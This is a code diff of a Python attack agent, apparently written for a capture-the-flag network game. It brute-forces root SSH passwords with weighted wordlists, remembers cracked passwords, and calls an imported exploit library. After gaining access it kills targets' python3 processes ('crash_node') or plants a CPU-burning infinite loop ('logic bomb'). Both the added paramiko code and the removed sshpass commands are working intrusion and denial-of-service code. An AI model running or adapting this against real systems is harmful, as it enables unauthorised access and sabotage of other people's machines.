@@ -7,6 +7,7 @@ import json
 import socket
 import subprocess
 import urllib.request
+import threading
 from concurrent.futures import ThreadPoolExecutor
 
 # --- CONFIG ---
@@ -164,17 +165,28 @@ def claim_node(target_ip):
     log(f"❌ Claim Failed: {data}")
     return False
 
+# --- ACTIONS ---
+# Removed: MarkovCracker (obsolete)
+import paramiko
+
+def attempt_login(password, ip):
+    try:
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        ssh.connect(ip, username='root', password=password, timeout=2, banner_timeout=5)
+        ssh.close()
+        return True
+    except: return False
+
 def crash_node(target_ip, password):
     log(f"💥 ATTACKING {target_ip}...")
-    # KILL COMMAND
-    cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@{target_ip} 'nohup pkill -9 python3 &'"
     try:
-        subprocess.run(cmd, shell=True, timeout=5)
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        ssh.connect(target_ip, username='root', password=password, timeout=5)
+        ssh.exec_command("nohup pkill -9 python3 &")
+        ssh.close()
         log(f"💀 CRASHED {target_ip}!!")
-        # Ensure we mark it as visited so we don't keep beating a dead horse (unless they respawn)
-        # Actually, if we crash them, they are gone. The node becomes empty?
-        # Orchestrator health check might restart them?
-        # For now, let's treat it as a victory and maybe move on.
         return True
     except Exception as e:
         log(f"❌ Crash Failed: {e}")
@@ -182,13 +194,13 @@ def crash_node(target_ip, password):
 
 def slow_node(target_ip, password):
     log(f"💣 LOGIC BOMBING {target_ip}...")
-    # CPU BURNER COMMAND: Calculates power of large numbers forever in background
-    # cmd = "nohup python3 -c 'while True: _=2**1000000' > /dev/null 2>&1 &"
-    # Actually, let's keep it simpler but impactful.
-    ssh_cmd = "import time; [x**100 for x in iter(int, 1)]" # Forever loop with math
-    cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@{target_ip} 'nohup python3 -c \"{ssh_cmd}\" > /dev/null 2>&1 &'"
     try:
-        subprocess.run(cmd, shell=True, timeout=5)
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        ssh.connect(target_ip, username='root', password=password, timeout=5)
+        # CPU BURNER: Forever loop with math
+        ssh.exec_command("nohup python3 -c \"while True: _=2**10000\" > /dev/null 2>&1 &")
+        ssh.close()
         log(f"🐢 SLOWED DOWN {target_ip}!!")
         return True
     except Exception as e:
@@ -224,7 +236,9 @@ hacking_brain = {
         "digit_1": 1.0,
         "digit_2": 1.0
     },
-    "known_passwords": {} # IP -> Password mapping (Literal Memory)
+    "known_passwords": {}, # IP -> Password mapping (Literal Memory)
+    "vulnerability_map": {}, # IP -> List of discovered vulnerabilities
+    "pattern_knowledge": {} # Grid pattern -> List of vulnerabilities
 }
 
 THEMES = {
@@ -269,12 +283,19 @@ def load_memory():
                 
                 visited = set(data.get('visited', []))
                 has_key = data.get('has_key', False)
-                hacking_brain = data.get('hacking_brain', hacking_brain)
+                
+                # Load hacking_brain with new fields
+                loaded_brain = data.get('hacking_brain', {})
+                hacking_brain['themes'] = loaded_brain.get('themes', hacking_brain['themes'])
+                hacking_brain['mutations'] = loaded_brain.get('mutations', hacking_brain['mutations'])
+                hacking_brain['known_passwords'] = loaded_brain.get('known_passwords', {})
+                hacking_brain['vulnerability_map'] = loaded_brain.get('vulnerability_map', {})
+                hacking_brain['pattern_knowledge'] = loaded_brain.get('pattern_knowledge', {})
                 
                 if 'team' in data:
                     TEAM = data['team']
                 
-                log(f"🧠 Memory Decrypted & Loaded. Shield: ACTIVE.")
+                log(f"🧠 Memory Decrypted & Loaded. Vulns known: {len(hacking_brain['vulnerability_map'])}")
         except Exception as e:
             log(f"⚠️ Memory Load Error: {e}")
 
@@ -472,28 +493,6 @@ class MarkovCracker:
         return pwd[:length]
 
 # --- ACTIONS ---
-cracker = MarkovCracker()
-
-def attempt_login(pwd, target_ip):
-    # Retry logic for network stability
-    for _ in range(3):
-        cmd = f"sshpass -p '{pwd}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 root@{target_ip} 'echo HACKED'"
-        try:
-            res = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=5)
-            if b"HACKED" in res.stdout:
-                return pwd
-            # If return code is 255 (ssh error), likely connection issue, so retry
-            if res.returncode == 255:
-                time.sleep(1.0)
-                continue
-            # If return code is 5 (auth error), break early
-            if res.returncode == 5:
-                break
-        except: 
-            time.sleep(1.0)
-            pass
-    return None
-
 def learn_from_hack(password, target_ip):
     global hacking_brain
     # 1. Literal Memory: Store for instant re-entry
@@ -524,8 +523,94 @@ def learn_from_hack(password, target_ip):
     log(f"🧠 Learned: Mutation '{found_mutation}' is active. Boosting weight.")
     save_memory()
 
+def calculate_min_corner_distance(x, y):
+    """Calculate Manhattan distance to nearest corner"""
+    dist_00 = x + y
+    dist_05 = x + (5 - y)
+    dist_50 = (5 - x) + y
+    dist_55 = (5 - x) + (5 - y)
+    return min(dist_00, dist_05, dist_50, dist_55)
+
+def learn_vulnerability_pattern(x, y, discovered_vulns):
+    """Learn which vulnerabilities appear at which grid locations"""
+    global hacking_brain
+    
+    min_dist = calculate_min_corner_distance(x, y)
+    
+    # Categorize by distance tier
+    if min_dist == 0:
+        pattern_key = "corners"
+    elif min_dist <= 2:
+        pattern_key = "edges"
+    else:
+        pattern_key = "center"
+    
+    # Store pattern
+    hacking_brain["pattern_knowledge"][pattern_key] = discovered_vulns
+    log(f"📊 Pattern Learned: {pattern_key} nodes have {len(discovered_vulns)} vulnerabilities")
+    save_memory()
+
+def predict_vulnerabilities(x, y):
+    """Predict which vulnerabilities likely exist based on location"""
+    min_dist = calculate_min_corner_distance(x, y)
+    
+    if min_dist == 0 and "corners" in hacking_brain["pattern_knowledge"]:
+        return hacking_brain["pattern_knowledge"]["corners"]
+    elif min_dist <= 2 and "edges" in hacking_brain["pattern_knowledge"]:
+        return hacking_brain["pattern_knowledge"]["edges"]
+    elif "center" in hacking_brain["pattern_knowledge"]:
+        return hacking_brain["pattern_knowledge"]["center"]
+    
+    return None  # Unknown, need to probe
+
+def background_password_guesser(target_ip, result_dict):
+    """Background thread that tries passwords while web exploits run"""
+    global hacking_brain
+    
+    # Build prioritized guess list based on Brain weights
+    theme_priority = sorted(hacking_brain["themes"].items(), key=lambda x: x[1], reverse=True)
+    mutation_priority = sorted(hacking_brain["mutations"].items(), key=lambda x: x[1], reverse=True)
+    
+    for theme_name, _ in theme_priority:
+        if result_dict["found"]:
+            return
+        
+        words = THEMES[theme_name]
+        for mut_type, _ in mutation_priority:
+            if result_dict["found"]:
+                return
+            
+            guesses = []
+            if mut_type == "raw":
+                guesses = words
+            elif mut_type == "digit_1":
+                for i in range(10):
+                    for w in words:
+                        guesses.append(f"{w}{i}")
+            elif mut_type == "digit_2":
+                for i in range(100):
+                    for w in words:
+                        guesses.append(f"{w}{i}")
+            
+            for pwd in guesses:
+                if result_dict["found"]:
+                    return
+                if attempt_login(pwd, target_ip):
+                    result_dict["found"] = True
+                    result_dict["password"] = pwd
+                    return
+                time.sleep(0.05)  # Rate limit
+
 def action_hack(target):
     log(f"⚔️ Action: HACK {target['ip']}")
+    
+    # Get coordinates for learning
+    try:
+        parts = target['ip'].split('.')
+        y = int(parts[2])
+        x = int(parts[3]) - 10
+    except:
+        x, y = 0, 0
     
     # 0. Check Literal Memory first (Instant Win)
     if target['ip'] in hacking_brain["known_passwords"]:
@@ -535,58 +620,81 @@ def action_hack(target):
             log(f"🔓 RE-ENTRY SUCCESS: {known_pwd}")
             return known_pwd
         else:
-            log(f"⚠️ RE-ENTRY FAILED: Password for {target['ip']} may have rotated. Re-learning...")
+            log(f"⚠️ RE-ENTRY FAILED: Password may have rotated. Re-learning...")
             del hacking_brain["known_passwords"][target['ip']]
-
-    # 1. Build prioritized guess list based on Brain weights
-    theme_priority = sorted(hacking_brain["themes"].items(), key=lambda x: x[1], reverse=True)
-    mutation_priority = sorted(hacking_brain["mutations"].items(), key=lambda x: x[1], reverse=True)
     
-    guesses = []
+    # 1. Determine which vulnerabilities to try
+    known_vulns = None
     
-    # Strategy: High-weight themes first
-    for theme_name, _ in theme_priority:
-        words = THEMES[theme_name]
+    # Check if we've already discovered this node's vulnerabilities
+    if target['ip'] in hacking_brain["vulnerability_map"]:
+        known_vulns = hacking_brain["vulnerability_map"][target['ip']]
+        log(f"📋 Known vulnerabilities for {target['ip']}: {', '.join(known_vulns)}")
+    else:
+        # Predict based on location pattern
+        predicted_vulns = predict_vulnerabilities(x, y)
         
-        # Within each theme, prioritize mutations by weight
-        for mut_type, _ in mutation_priority:
-            if mut_type == "raw":
-                for w in words:
-                    if w not in guesses: guesses.append(w)
-            elif mut_type == "digit_1":
-                for i in range(10):
-                    for w in words:
-                        p = f"{w}{i}"
-                        if p not in guesses: guesses.append(p)
-            elif mut_type == "digit_2":
-                for i in range(100):
-                    for w in words:
-                        p = f"{w}{i:01}" # Support single and double? 
-                        # Actually 0-99 covers digit_1 if we aren't careful.
-                        # Let's just do robust 2-digit.
-                        p = f"{w}{i}"
-                        if p not in guesses: guesses.append(p)
-
-    log(f"Trying prioritized guesses ({len(guesses)} variations) with 4 workers...")
-    
-    found_password = None
-    with ThreadPoolExecutor(max_workers=4) as executor:
-        futures = {executor.submit(attempt_login, pwd, target['ip']): pwd for pwd in guesses}
-        for future in futures:
-            if found_password: break
+        if predicted_vulns is not None:
+            log(f"🔮 Predicted vulnerabilities: {', '.join(predicted_vulns)}")
+            known_vulns = predicted_vulns
+        else:
+            # Reconnaissance - discover what's available
             try:
-                result = future.result(timeout=5)
-                if result:
-                    found_password = result
-                    executor.shutdown(wait=False, cancel_futures=True)
-                    break
-            except: pass
-            
-    if found_password:
-        log(f"🔓 CRACKED: {found_password}")
-        learn_from_hack(found_password)
-        return found_password
+                from exploits import reconnaissance
+                log(f"🔍 Probing {target['ip']} for vulnerabilities...")
+                known_vulns = reconnaissance(target['ip'])
+                log(f"✅ Discovered: {', '.join(known_vulns) if known_vulns else 'None'}")
+                
+                # Learn the pattern
+                if known_vulns:
+                    learn_vulnerability_pattern(x, y, known_vulns)
+            except ImportError:
+                known_vulns = []  # Fallback if exploits.py not available
         
+        # Save to memory
+        hacking_brain["vulnerability_map"][target['ip']] = known_vulns
+        save_memory()
+    
+    # 2. Import exploit library
+    try:
+        from exploits import EXPLOIT_MAP
+    except ImportError:
+        EXPLOIT_MAP = {}
+    
+    # 3. Start background password guesser
+    password_result = {"found": False, "password": None}
+    guesser_thread = threading.Thread(target=background_password_guesser, args=(target['ip'], password_result))
+    guesser_thread.daemon = True
+    guesser_thread.start()
+    
+    # 4. Try ONLY the known/predicted vulnerabilities
+    if known_vulns and EXPLOIT_MAP:
+        for vuln_name in known_vulns:
+            if password_result["found"]:
+                break
+            
+            exploit_func = EXPLOIT_MAP.get(vuln_name)
+            if exploit_func:
+                try:
+                    password = exploit_func(target['ip'])
+                    if password and attempt_login(password, target['ip']):
+                        log(f"🔓 PWNED via {vuln_name}: {password}")
+                        password_result["found"] = True
+                        learn_from_hack(password, target['ip'])
+                        return password
+                except:
+                    pass
+    
+    # 5. Wait for background guesser
+    if not password_result["found"]:
+        log("⏳ Web exploits failed. Waiting for password guesser...")
+        guesser_thread.join(timeout=30)
+    
+    if password_result["found"]:
+        log(f"🔓 PWNED via Brute Force: {password_result['password']}")
+        learn_from_hack(password_result["password"], target['ip'])
+        return password_result["password"]
+    
     return None
 
 def action_scan():
@@ -633,11 +741,19 @@ def main():
     if start_ip not in visited:
         visited.add(start_ip)
     
+    log("🧠 Initializing Brain...")
     brain = Brain(team_id=TEAM)
+    log("✅ Brain initialized successfully")
     
+    log("🔄 Entering main loop...")
     while True:
+        # 0. Check for CTF Objectives (Key Detection & Win Condition)
+        check_for_key()
+        
         # 1. Observe
+        log("📡 Scanning network...")
         targets = action_scan()
+        log(f"Found {len(targets)} targets")
         state = brain.get_state(targets)
         
         # 2. Act
